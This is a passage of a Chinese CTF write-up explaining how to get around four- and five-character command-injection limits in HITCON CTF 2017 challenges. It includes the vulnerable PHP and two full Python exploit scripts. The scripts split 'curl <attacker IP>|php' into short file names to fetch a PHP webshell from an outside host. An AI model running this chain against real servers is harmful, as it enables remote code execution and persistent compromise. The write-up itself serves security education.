data-original=\"https://p2.ssl.qhimg.com/t0179a43f9481b4fbc6.png\"></p>\n<p><span><strong><span>利用续行符拆分命令成多行</span></strong></span></p>\n<p style=\"text-align: center\"><img title=\"t01745a941a746a7ac0.png\" alt=\"http://p5.qhimg.com/t01745a941a746a7ac0.png\" data-original=\"https://p0.ssl.qhimg.com/t01d2eac72941e42be9.png\"></p>\n<p><span><strong><span>用两个字符在Linux下创建文件</span></strong></span></p>\n<p style=\"text-align: center\"><img title=\"t01485c8bfc8fbf987f.png\" alt=\"http://p5.qhimg.com/t01485c8bfc8fbf987f.png\" data-original=\"https://p2.ssl.qhimg.com/t019808b722225de73d.png\"></p>\n<p><span><strong><span>将命令执行结果重定向到文件</span></strong></span></p>\n<p style=\"text-align: center\"><img title=\"t01e45c7a16d86c4e2c.png\" alt=\"http://p9.qhimg.com/t01e45c7a16d86c4e2c.png\" data-original=\"https://p0.ssl.qhimg.com/t012de068258a2e3d04.png\"></p>\n<p><span><strong><span>利用重定向向文件追加内容</span></strong></span></p>\n<p style=\"text-align: center\"><img title=\"t0125c23ce2f3d45621.png\" alt=\"http://p2.qhimg.com/t0125c23ce2f3d45621.png\" data-original=\"https://p4.ssl.qhimg.com/t015f5da0f73df752b7.png\"></p>\n<p><span><strong><span>删除文件</span></strong></span></p>\n<p style=\"text-align: center\"><img title=\"t01e267cc27d6277631.png\" alt=\"http://p4.qhimg.com/t01e267cc27d6277631.png\" data-original=\"https://p1.ssl.qhimg.com/t0121856133157c3f34.png\"></p>\n<p><span><strong><span>ls 的文件排列顺序</span></strong></span></p>\n<p><span>一句alphabetical耐人寻味，不过大致顺序就是如下图所示。</span></p>\n<p style=\"text-align: center\"><img title=\"t01e104d2e591a66fcd.png\" alt=\"http://p7.qhimg.com/t01e104d2e591a66fcd.png\" data-original=\"https://p3.ssl.qhimg.com/t01c4dd700d11f91860.png\"></p>\n<p><span style=\"font-size: 18px\"><strong><span><br></span></strong></span></p>\n<p><span style=\"font-size: 18px\"><strong><span>开始表演</span></strong></span></p>\n<p><span>假设我有一台目标服务器能够访问到的公网主机，为了方便我把该主机IP转换成长整数，然后利用以上的知识将 curl ip &gt; A 用续行方式切割成多行写进文件 A ，然后执行 sh A 就可以下载到预先放在公网主机上的文件并且覆盖本地的文件A，而下载下来的文件内容是用来写PHP木马的PHP代码，我再执行 php A就可以写个自己的webshell进去啦。</span></p>\n<p style=\"text-align: center\"><img title=\"t0106f100f423201580.png\" alt=\"http://p8.qhimg.com/t0106f100f423201580.png\" data-original=\"https://p2.ssl.qhimg.com/t016294d3a767429eab.png\"></p>\n<p><span>这里比较取巧的是我的公网IP转成长整形恰好能分割成顺序的四段，如果构造不出来，可以试试十六进制，八进制，找台能用的主机等等：）或者继续往下看，还会有其他办法。</span></p>\n<p><span>另外，其实GET也是能用的，只是目标主机里没有安装所以这题不能用。</span></p>\n<p><span>接下来让我们完成最后30%的工作，写个exp。</span></p>\n<p><span></span></p>\n<pre><code># -*- coding:utf8 -*-\nimport requests as r\nimport hashlib\nurl = 'http://52.199.204.34/'\n# 查询自己的IP\nip = r.get('http://ipv4.icanhazip.com/').text.strip()\nsandbox = url + 'sandbox/' + hashlib.md5('orange' + ip).hexdigest() + '/'\n \nreset = url + '?reset'\ncmd = url + '?cmd='\nbuild = ['&gt;cur\\',\n         '&gt;l \\',\n         'ls&gt;A',\n         'rm c*',\n         'rm l*',\n         '&gt;105\\',\n         '&gt;304\\',\n         '&gt;301\\',\n         '&gt;9&gt;\\',\n         'ls&gt;&gt;A',\n         'sh A',\n         'php A'\n         ]\n# 如果目标服务器有GET，这个也是可以打的\n# build = ['&gt;GE\\',\n#          '&gt;T\\ \\',\n#          'ls&gt;A',\n#          'rm G*',\n#          'rm T*',\n#          '&gt;105\\',\n#          '&gt;304\\',\n#          '&gt;301\\',\n#          '&gt;9&gt;\\',\n#          'ls&gt;&gt;A']\nr.get(reset)\nfor i in build:\n    s = r.get(cmd + i)\n    print '[%s]' % s.status_code, s.url\n \ns = r.get(sandbox + 'fun.php?cmd=uname -a')\nprint 'n' + '[%s]' % s.status_code, s.url\nprint s.text</code></pre>\n<p><span>运行效果</span></p>\n<p style=\"text-align: center\"><img title=\"t013370047191f9904f.png\" alt=\"http://p1.qhimg.com/t013370047191f9904f.png\" data-original=\"https://p0.ssl.qhimg.com/t014cfd9d61e5c45b44.png\"></p>\n<p><span style=\"font-size: 18px\"><strong><span><br></span></strong></span></p>\n<p><span style=\"font-size: 18px\"><strong><span>挑战升级</span></strong></span></p>\n\n<p><span>这篇文章有趣的地方才刚刚开始。</span></p>\n<p><span>代码只改了一个字符，但趣味已经不在一个量级。一脸懵逼的我看了大佬们的wp后兴奋不已。</span></p>\n<p><span>BabyFirst Revenge v2：</span></p>\n<p><span></span></p>\n<pre><code>&lt;?php\n    $sandbox = '/www/sandbox/' . md5(\"orange\" . $_SERVER['REMOTE_ADDR'])\n \n    @mkdir($sandbox)\n    @chdir($sandbox)\n    if (isset($_GET['cmd']) &amp; &amp; strlen($_GET['cmd']) &lt;= 4) {\n        @exec($_GET['cmd'])\n    } else if (isset($_GET['reset'])) {\n        @exec('/bin/rm -rf ' . $sandbox)\n    }\n    highlight_file(__FILE__)</code></pre>\n<p><span></span></p>\n<p><span style=\"font-size: 18px\"><strong><span>热烈分析</span></strong></span></p>\n<p><span>只有四个字符的施展空间意味着我们能做的事情少之又少，但Linux本身的简洁给了我们机会。</span></p>\n<p><span>突破之旅从神奇的星号 * 开始。</span></p>\n<p style=\"text-align: center\"><img title=\"t011d2b1095c9235710.png\" alt=\"http://p1.qhimg.com/t011d2b1095c9235710.png\" data-original=\"https://p4.ssl.qhimg.com/t01c68ec189f2c38155.png\"></p>\n<p><span>经过简单测试我们猜测 * 的作用相当于 `ls` 。这其实相当厉害，我们本就基本上可以创建任意名字的短文件，现在又可以一个字符就把这些文件名连起来当作命令执行，这提供了很大的想象空间。</span></p>\n<p style=\"text-align: center\"><img title=\"t016acaa6a8c9c4497c.png\" alt=\"http://p1.qhimg.com/t016acaa6a8c9c4497c.png\" data-original=\"https://p3.ssl.qhimg.com/t01fbeb47c643a3f4fd.png\"></p>\n<p><span>还有本质上一样但现象很有趣的，待会儿会用到：</span></p>\n<p style=\"text-align: center\"><img title=\"t015afceef8c0976153.png\" alt=\"http://p7.qhimg.com/t015afceef8c0976153.png\" data-original=\"https://p4.ssl.qhimg.com/t01cdd7b9abeb575d5f.png\"></p>\n<p><span>虽然这些特技提供了一些可能性，但是 ls 列出的文件顺序问题仍然是个挑战，我们很难在 alphabetical 序的基础上构造出有用的命令。</span></p>\n<p><span>写入时间是我们可以控制的，如果能执行 ls –t（将文件按时间排序输出），那么只要把想执行的命令分割成若干段然后逆序写入，就可以随心所欲地构造出任意命令。考虑到 ls -t 本身就已经有4个字符了，我们故技重施，先将 ls -t &gt; f 写入文件 g 中，然后执行 sh g 即可将我们分段逆序写入的命令拼接起来。</span></p>\n<p><span>在开始操作前，再介绍两个会用到的命令：dir 和 rev。</span></p>\n<p><span style=\"font-size: 18px\"><strong><span><br></span></strong></span></p>\n<p><span style=\"font-size: 18px\"><strong><span>dir</span></strong></span></p>\n<p><span>在GNU</span><span>文档中有下图这样的描述：</span></p>\n<p style=\"text-align: center\"><img title=\"t014c12aa56fd9386f9.png\" alt=\"http://p1.qhimg.com/t014c12aa56fd9386f9.png\" data-original=\"https://p0.ssl.qhimg.com/t01406e4dcc8e6ff0f7.png\"></p>\n<p><span>虽然基本上和 ls 一样，但有两个好处，一是开头字母是d ，这使得它在 alphabetical 序中靠前，二是按列输出，不换行。</span></p>\n<p></p>\n<p><span style=\"font-size: 18px\"><strong><span>rev</span></strong></span></p>\n<p><span>这个前面出场过，可以反转文件每一行的内容。</span></p>\n<p style=\"text-align: center\"><img title=\"t01184834f69bddb51a.png\" alt=\"http://p8.qhimg.com/t01184834f69bddb51a.png\" data-original=\"https://p5.ssl.qhimg.com/t010c4a372f495ce020.png\"></p>\n<p><span>实验一下：</span></p>\n<p style=\"text-align: center\"><img title=\"t0192fac539940680bc.png\" alt=\"http://p2.qhimg.com/t0192fac539940680bc.png\" data-original=\"https://p2.ssl.qhimg.com/t016a0cf34a18724b08.png\"></p>\n<p></p>\n<p><span style=\"font-size: 18px\"><strong><span>开始挑战</span></strong></span></p>\n<p><span>需要知道的命令和 tips 都已经介绍了，下面是代码和解释：</span></p>\n<p><span></span></p>\n<pre><code>#-*-coding:utf8-*-\nimport requests as r\nfrom time import sleep\nimport random\nimport hashlib\ntarget = 'http://52.197.41.31/'\n \n# 存放待下载文件的公网主机的IP\nshell_ip = 'xx.xx.xx.xx'\n \n# 本机IP\nyour_ip = r.get('http://ipv4.icanhazip.com/').text.strip()\n \n# 将shell_IP转换成十六进制\nip = '0x' + ''.join([str(hex(int(i))[2:].zfill(2))\n                     for i in shell_ip.split('.')])\n \nreset = target + '?reset'\ncmd = target + '?cmd='\nsandbox = target + 'sandbox/' + \n    hashlib.md5('orange' + your_ip).hexdigest() + '/'\n \n# payload某些位置的可选字符\npos0 = random.choice('efgh')\npos1 = random.choice('hkpq')\npos2 = 'g'  # 随意选择字符\n \npayload = [\n    '&gt;dir',\n    # 创建名为 dir 的文件\n \n    '&gt;%s&gt;' % pos0,\n    # 假设pos0选择 f , 创建名为 f&gt; 的文件\n \n    '&gt;%st-' % pos1,\n    # 假设pos1选择 k , 创建名为 kt- 的文件,必须加个pos1，\n    # 因为alphabetical序中t&gt;s\n \n    '&gt;sl',\n    # 创建名为 &gt;sl 的文件；到此处有四个文件，\n    # ls 的结果会是：dir f&gt; kt- sl\n \n    '*&gt;v',\n    # 前文提到， * 相当于 `ls` ，那么这条命令等价于 `dir f&gt; kt- sl`&gt;v ，\n    #  前面提到dir是不换行的，所以这时会创建文件 v 并写入 f&gt; kt- sl\n    # 非常奇妙，这里的文件名是 v ，只能是v ，没有可选字符\n \n    '&gt;rev',\n    # 创建名为 rev 的文件，这时当前目录下 ls 的结果是： dir f&gt; kt- rev sl v\n \n    '*v&gt;%s' % pos2,\n    # 魔法发生在这里： *v 相当于 rev v ，* 看作通配符。前文也提过了，体会一下。\n    # 这时pos2文件，也就是 g 文件内容是文件v内容的反转： ls -tk &gt; f\n \n    # 续行分割 curl 0x11223344|php 并逆序写入\n    '&gt;p',\n    '&gt;ph\\',\n    '&gt;|\\',\n    '&gt;%s\\' % ip[8:10],\n    '&gt;%s\\' % ip[6:8],\n    '&gt;%s\\' % ip[4:6],\n    '&gt;%s\\' % ip[2:4],\n    '&gt;%s\\' % ip[0:2],\n    '&gt; \\',\n    '&gt;rl\\',\n    '&gt;cu\\',\n \n    'sh ' + pos2,\n    # sh g ;g 的内容是 ls -tk &gt; f ，那么就会把逆序的命令反转回来，\n    # 虽然 f 的文件头部会有杂质，但不影响有效命令的执行\n    'sh ' + pos0,\n    # sh f 执行curl命令，下载文件，写入木马。\n]\n \ns = r.get(reset)\nfor i in payload:\n    assert len(i) &lt;= 4\n    s = r.get(cmd + i)\n    print '[%d]' % s.status_code, s.url\n    sleep(0.1)\ns = r.get(sandbox + 'fun.php?cmd=uname -a')\nprint '[%d]' % s.status_code, s.url\nprint s.text</code></pre>\n<p><span>运行效果：</span></p>\n<p style=\"text-align: center\"><img title=\"t01b1145c403a84ced2.png\" alt=\"http://p8.qhimg.com/t01b1145c403a84ced2.png\" data-original=\"https://p2.ssl.qhimg.com/t01d42702502e8f186e.png\"></p>\n<p><span style=\"font-size: 18px\"><strong><span><br></span></strong></span></p>\n<p><span style=\"font-size: 18px\"><strong><span>后记</span></strong></span></p>\n<p><span>我相信除了文中给出的方法外一定还有一些奇招，大家可以多多探索，可以围观HITCON CTF 2107的<a href=\"http://t.cn/RlNVPfp\" target=\"_self\">官方解答区</a></span><span>，还可以学习下Phithon师傅的《<a href=\"http://t.cn/RlNcllC\" target=\"_self\">小密圈里的那些奇技淫巧</a>》</span><span> 中与本文主题相关的部分。</span></p>\n<p><span>最后，如果关于文章内容有任何建议或疑惑，你可以在</span><a href=\"https://findneo.github.io/\"><span>https://findneo.github.io/</span></a> 联系<span>本文作者。感谢阅读o/</span></p>\n</body>\n</html>","index":[[]],"success":true},"share":{"title":"【CTF 攻略】如何绕过四个字符限制getshell","desc":"本文主要整理如何巧用Linux命令绕过命令注入点的字符数量限制，内容围绕HITCON CTF 2017 的两道题展开，先讲五个字符的限制，再讲四个字符的。在此感谢下主办方分享这么有趣的点子。","imgUrl":"https://p2.ssl.qhimg.com/sdm/160_160_100/t011ba710533fd2bda6.png"},"author":{"nickname":"qqwe_01","user_url":"","id":123875,"avatar":"https://p5.ssl.qhmsg.com/dm/200_200_100/t01793924aa4af5c1a5.jpg","banner":"https://p0.ssl.qhimg.com/t014757b72460d855bf.png","location":"","user_label":"","description":"这个人太懒了，签名都懒得写一个","register_date":"2017-11-29 02:44:47","self":false,"follow":false,"post_count":3,"follower_count":1,"follow_count":0,"comment_count":0},"relevant":[{"id":89855,"title":"Shanghai-DCTF-2017 线下攻防Pwn题","date":"2017-12-08 18:12:56"},{"id":87307,"title":"【CTF攻略】hitcon2017之ghost in the heap writeup","date":"2017-11-24 13:56:08"},{"id":87206,"title":"【CTF 攻略】第三届上海市大学生网络安全大赛Writeup","date":"2017-11-10 10:54:26"},{"id":87191,"title":"【CTF 攻略】极棒GeekPwn工控CTF Writeup","date":"2017-11-08 18:27:59"},{"id":86987,"title":"【CTF 攻略】DerbyCon 2017 CTF Write Up","date":"2017-10-11 10:46:18"},{"id":86984,"title":"【CTF 攻略】CTF线下防御战 — 让你的靶机变成“铜墙铁壁”","date":"2017-10-10 19:38:53"},{"id":86847,"title":"【CTF 攻略】ISC2017 DEFCON GROUP 解救Cookie Write-Up","date":"2017-09-14 18:21:09"}],"authorPostList":[{"post_id":87203,"title":"【CTF 攻略】如何绕过四个字符限制getshell","cover":"https://p5.ssl.qhimg.com/sdm/229_160_100/t011ba710533fd2bda6.png","date":"2017-11-10 10:05:57"},{"post_id":86330,"title":"【技术分享】基于误植域名的水坑攻击实践","cover":"https://p4.ssl.qhimg.com/sdm/229_160_100/t011a5e0b60861c8dc8.png","date":"2017-06-26 17:53:38"},{"post_id":85792,"title":"【国际资讯】震惊！网络犯罪成本竟然如此之低？发起DDOS攻击仅要50刀？","cover":"https://p4.ssl.qhimg.com/sdm/229_160_100/t016c8cd12db33f6d2f.jpg","date":"2017-03-27 13:11:07"}],"cookie":[]}};
//published at: 6/30/2023, 6:05:02 AM</script>

<script src="https://s0.ssl.qhimg.com/static/a89b1e55fab19834,969b9d2ab6d58ff9.js"></script>
<script src="https://s0.ssl.qhimg.com/static/e855bc476c0070c4,d70645fabcfd28e5,b00f894d26352cfe,374cd4f654903275,1fbf0cc911f15a9c.js"></script>
<script src="https://s0.ssl.qhimg.com/static/43c736269a19e5f8,d7c4492c306d9e12.js"></script>
<script src="https://s0.ssl.qhimg.com/static/c3f64e723fc684b2,d29a864a4b5dd4b6,5c4b8b1bbe75533d,f59329488ebbc180,569b6657398e046f,50a9d6f78d7b9c2b,ffa01aa1dfa9875c,1e0c54ddfbe618cb,cc52ec6e18fb5e0f,7e2ef3c63800d75a,163f062eddf12afb,12d46f82993a5686,a0f3df7d061398da,d13f12550890a37e,a1038fbbcca5451e,b4f09346293512df,c4dd2a401c8d680a,2cf22cf2afd2abeb,097579769ff1a9e5,cdf1af3ce7fb15c0,52624e35e0a71a1d,2a6f530aa0ff4ab1,a1dbcc9d979007e3,21c0bbbac4162adc,b48c87c047227d8d,a4c086374473de3d,8986a347a9b1bf47,0df21b2fbcae7ee2,5ed46454edb70992,48968bfda2315809,5df7f89714480d5b,2ac5433e81c47d4c,3458ad5e1fb21426,c0f2dbc584b90d28,9b256882cc6d1129,f45edb50c819dfb9,22dc6a03fc216c80,7603fdbafaed5beb,8f3880f75e82b893,7e4ef35e980d3675,1fbafd3380b80586.js"></script>
</body>

</html>